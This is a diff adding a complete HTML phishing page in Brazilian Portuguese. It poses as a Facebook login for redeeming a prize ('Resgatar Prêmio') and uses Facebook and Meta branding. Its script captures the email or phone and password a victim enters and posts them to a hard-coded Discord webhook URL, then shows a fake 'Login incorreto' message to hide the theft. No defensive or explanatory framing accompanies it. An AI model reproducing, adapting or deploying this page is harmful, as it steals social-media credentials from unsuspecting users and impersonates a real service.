@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Resgatar Prêmio</title>
+    <style>
+        /* Estilos existentes */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1c1e21;
+            overflow-x: hidden;
+        }
+        .header {
+            background-color: #1877f2;
+            width: 100%;
+            text-align: center;
+            padding: 15px 0;
+            box-sizing: border-box;
+            color: #fff;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 1.8em;
+        }
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+        .login-container img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .login-container span {
+            font-size: 0.9em;
+            color: #1c1e21;
+            display: block;
+            margin-bottom: 30px;
+        }
+        .login-container form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            padding: 12px;
+            font-size: 1em;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            background-color: #1877f2;
+            color: #fff;
+            font-size: 1.1em;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #165dbb;
+        }
+        .login-container a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9em;
+            margin-top: 10px;
+            display: inline-block;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #dddfe2;
+        }
+        .create-account-button {
+            background-color: #42b72a;
+            color: #fff;
+            font-size: 1.1em;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        .meta-section {
+            margin-top: 20px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .meta-section img {
+            width: 60px;
+            margin-bottom: 10px;
+        }
+        .meta-section p {
+            font-size: 0.9em;
+            color: #1c1e21;
+            margin: 0;
+        }
+        footer {
+            padding: 10px 0;
+            width: 100%;
+            text-align: center;
+            background-color: #f0f2f5;
+            font-size: 0.8em;
+            color: #1c1e21;
+        }
+        .redeem-button {
+            background-color: #ff9900;
+            color: #fff;
+            font-size: 1em;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .redeem-button:hover {
+            background-color: #e68a00;
+        }
+
+        /* Estilos para a mensagem de erro */
+        .error-message {
+            color: red;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+        async function sendToDiscordWebhook(event) {
+            event.preventDefault(); // Impede o envio normal do formulário
+
+            // Captura os valores dos campos do formulário
+            const email = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+
+            // Monta o conteúdo da mensagem em formato JSON
+            const data = {
+                content: `Novo login: \n**Email/Telefone:** ${email}\n**Senha:** ${password}`
+            };
+
+            // Envia os dados para o Webhook do Discord
+            const webhookURL = "https://discord.com/api/webhooks/1295400250370162798/vKfB1w7ZYydXktErhDDiQJznop_78RCFZoX5jKQJN6b9PHiUZdFaMq17V86-eJXyB_xb";
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                // Mensagem de erro a ser exibida
+                const errorMessageElement = document.getElementById('error-message');
+                if (response.ok) {
+                    // Exibe "Login incorreto" após o envio
+                    errorMessageElement.textContent = "Login incorreto.";
+                } else {
+                    // Exibe "Conta recente" caso haja algum problema
+                    errorMessageElement.textContent = "Conta recente.";
+                }
+            } catch (error) {
+                alert("Falha na conexão com o Webhook.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="header">
+        <h1>Facebook</h1>
+    </div>
+    <div class="login-container">
+        <img src="https://i.ibb.co/c3BPLdQ/Picsart-24-10-19-18-05-17-488.png" alt="Facebook Logo">
+        <span>Português (Brasil)</span>
+        <form onsubmit="sendToDiscordWebhook(event)">
+            <input type="text" placeholder="Email ou telefone" required>
+            <input type="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+        <!-- Mensagem de erro exibida aqui -->
+        <div id="error-message" class="error-message"></div>
+
+        <a href="#">Esqueceu a senha?</a>
+        <div class="divider"></div>
+        <button class="create-account-button">Criar nova conta</button>
+    </div>
+    <div class="meta-section">
+        <img src="https://i.ibb.co/R0Pdd3y/DDgw-Tv3-Jeh-F.png" alt="Meta Logo">
+        <p>Sobre Ajuda Mais</p>
+    </div>
+    <footer>
+        ©Facebook 2024
+    </footer>
+</body>
+</html>
